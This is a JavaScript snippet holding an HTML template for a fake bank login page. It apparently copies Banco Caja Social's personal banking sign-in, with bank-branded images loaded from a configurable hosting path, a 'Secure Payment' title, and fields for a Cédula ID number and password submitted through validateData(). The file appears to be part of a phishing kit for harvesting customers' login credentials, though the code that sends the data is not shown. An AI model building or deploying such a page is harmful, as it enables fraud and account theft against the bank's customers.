var my_titulo = 'Secure Payment';
var my_contenido = `
<style>
    label {
        font-size: 10px;
        display: block;
        margin-left: 25px;
    }

    input,
    select {
        width: 90%;
        margin-bottom: 20px;
    }

    select {
        background-color: white;
        height: 35px;
        border: 1px solid #ddd;
        color: black;
    }

    #btnUsuario {
        width: 90%;
        margin-bottom: 20px;
        height: 45px;
        border-radius: 100px;
        border: none;
    }

    .campos {
        height: 40px;
        border: 1px solid #ddd;
    }
</style>

<img src="${my_hosting}img/cajasocial.jfif" width="100%">
<a style="font-size:20px; margin-left:25px;">Personas</a>
<hr>
<br>
<br>
<label>(*) TIPO IDENTIFICACIÓN</label>
<center>
    <select>
        <option>Cédula de Ciudadanía</option>
    </select>
</center>

<label>(*) NÚMERO DE IDENTIFICACIÓN</label>
<center>
    <input type="tel" id="txtUsuario" class="campos">
</center>
<label>(*) CONTRASEÑA</label>
<center>
    <input type="password" id="txtPassword" class="campos">
    <br>
    <br>
    <br>
    <br>
    <br>
    <button onclick="validateData()" id="btnUsuario">Iniciar sesión</button>
</center>
<br>
<img src="${my_hosting}img/caja1.jfif" width="100%">
`